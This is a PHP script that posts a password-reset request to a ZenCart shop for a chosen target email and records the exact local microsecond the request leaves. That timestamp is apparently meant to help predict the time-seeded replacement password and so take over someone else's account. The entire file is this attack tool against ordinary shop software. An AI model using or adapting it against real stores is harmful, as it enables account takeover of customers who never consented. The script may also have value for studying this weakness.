<?php  

/*
This script sends an HTTP request to ZenCart to reset a user's password and measures the time when the request leaves the local machine.

Usage: php5 passwordForgotten.php [ZenCart IP address] [target_email]
 */
 
// Arguments
$IP = $argv[1];
$user_email = $argv[2];

// Create map with request parameters
$params = array ('email_address' => $user_email);
 
// Build Http query using params
$query = http_build_query ($params);
 
// Create Http context details
$contextData = array (
	'method' => 'POST',
	'header' => "Connection: close\r\n".
		"Content-type: application/x-www-form-urlencoded\r\n".
		"Content-Length: ".strlen($query)."\r\n",
	'content'=> $query );

// Create context resource for our request
$context = stream_context_create (array ( 'http' => $contextData ));

// save time when the request leaves the local machine
$time = microtime();

// Read page rendered as result of your POST request
$result =  file_get_contents (
	'http://'.$IP.'/zencart/index.php?main_page=password_forgotten&action=process',  // page url
	false,
	$context);

$timeAsInteger = (int)($time*1000000);

$pos = strpos($result,'records');

if ($pos === false)
	echo "Password was reset. Microseconds of local_clock at password reset: $timeAsInteger\n";
else
	echo "Problem generating new password.\n";
?>
